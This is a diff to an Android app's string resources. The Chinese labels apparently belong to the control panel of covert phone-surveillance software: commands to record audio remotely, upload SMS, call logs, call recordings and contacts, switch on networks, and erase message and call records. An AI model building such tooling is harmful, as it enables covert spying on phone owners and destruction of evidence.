@@ -3,10 +3,59 @@
 
     <string name="app_name">Controller</string>
     <string name="hello_world">Hello world!</string>
-
+    <string name="send_command_confirm">你确定要发送以下命令吗？</string>
+    <string name="confirm">确定</string>
+    <string name="next">下一步</string>
+    <string name="input_audio_time">请输入录音时间（分钟）</string>
+    <string name="input_hint_int">大于0的整数</string>
+    <string name="send_command_success">命令发送成功！</string>
+    <string name="send_command_fail">命令发送失败！</string>
+    <string name="input_string_alarm">输入不能为空！</string>
+    <string name="input_int_alarm">输入必须大于0！</string>
+    <string name="copy_to_clipboard_success">已经将命令复制到剪切板！</string>
     
+
+    <!--  -->
+
     <string name="btn_turn_up">调大音量</string>
     <string name="btn_turn_down">调低音量</string>
-    <string name="btn_call_me"></string>
-    
+
+    <!--  -->
+    <string name="clear_title">清除命令</string>
+    <string name="clear_msg">清除短信记录</string>
+    <string name="clear_call">清除通话记录</string>
+    <string name="clear_call_audio">清除通话录音记录</string>
+    <string name="clear_other_audio">清除其它录音记录</string>
+    <string name="clear_all">清除所有记录</string>
+
+    <!--  -->
+
+    <string name="normal_title">常规控制</string>
+    <string name="normal_turn_up">调大音量</string>
+    <string name="normal_calm_down">静音</string>
+    <string name="normal_call_me">给我打电话</string>
+    <string name="normal_record_time">录音N分钟</string>
+    <string name="normal_record_start">开始录音</string>
+    <string name="normal_record_end">结束录音</string>
+
+    <!--  -->
+
+    <string name="mobile_title">有网上传</string>
+    <string name="mobile_msg_call">上传短信和通话记录</string>
+    <string name="mobile_call_audio">上传通话录音</string>
+    <string name="mobile_call_other_audio">上传其它录音</string>
+    <string name="mobile_all">上传以上全部</string>
+    <string name="mobile_contacts">上传电话本</string>
+    <string name="mobile_turnup">开启移动网络</string>
+
+    <!--  -->
+
+    <string name="wifi_title">WIFI上传</string>
+    <string name="wifi_msg_call">上传短信和通话记录</string>
+    <string name="wifi_call_audio">上传通话录音</string>
+    <string name="wifi_call_other_audio">上传其它录音</string>
+    <string name="wifi_all">上传以上全部</string>
+    <string name="wifi_contacts">上传电话本</string>
+    <string name="wifi_turnup">开启WIFI网络</string>
+
 </resources>
